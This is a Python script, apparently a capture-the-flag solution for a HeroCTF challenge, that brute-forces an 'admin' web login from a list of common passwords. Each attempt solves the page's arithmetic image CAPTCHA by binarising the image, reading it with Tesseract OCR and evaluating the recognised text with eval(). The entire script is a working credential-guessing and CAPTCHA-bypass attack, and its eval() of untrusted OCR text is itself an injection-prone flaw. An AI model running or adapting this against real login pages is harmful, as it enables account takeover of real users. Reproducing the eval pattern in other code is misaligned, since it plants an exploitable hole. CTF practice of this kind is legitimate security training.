```python
#coding:utf-8

import requests
import bs4
import base64
import pytesseract
from PIL import Image

url = "http://chall3.heroctf.fr:8081/login"

passwordsList = open("500-worst-passwords.txt").read().split()

cookie = {"session": "XXXXX"}

w=0
while w < len(passwordsList):
    password = passwordsList[w]

    imgRecup = requests.get(url, cookies=cookie)

    soup = bs4.BeautifulSoup(imgRecup.content, "html.parser")

    imgBase64Break = soup.img["src"].split(",")[1]

    imgBase64 = ""
    i=0
    while i < len(imgBase64Break):
        if imgBase64Break[i] == "%":
            imgBase64 += chr(int(imgBase64Break[i+1:i+3], 16))
            i+=3
        else:
            imgBase64 += imgBase64Break[i]
            i+=1

    try:
        open("captcha.png", "wb").write(base64.b64decode(imgBase64))

        captchaImg = Image.open("captcha.png")
        x, y = captchaImg.size

        pix = captchaImg.load()
        
        for i in range(x):
            for j in range(y):
                if pix[i, j] != (0, 0, 0):
                    pix[i, j] = (255, 255, 255)

        captchaImg.save("captcha.png")
    except:
        continue

    try:
        calcul = pytesseract.image_to_string("captcha.png").replace("x", "*").strip()
        code = int(eval(calcul))

        print(f"[ {w} ]")
        print(f"CODE : {code}")
        print(f"PASS TEST : {password}")

        bodyPostRequests = {"username":"admin", "password":password, "pincode":code}
        login = requests.post(url, data=bodyPostRequests, cookies=cookie)

        print(f"STATUS CODE : {login.status_code}\n")
        print("-"*50)

        if login.content.find(b"Invalid pincode") !=-1:
            continue
            
        if login.content.find(b"Invalid login or password") == -1:
            print(f"[*] CONTENT {login.content.decode()}\n")
            print("[+] USER : admin")
            print(f"[+] PASS : {password}")
            print(f"[+] PINCODE : {code}")
            break

        w += 1
    except:
        pass
```
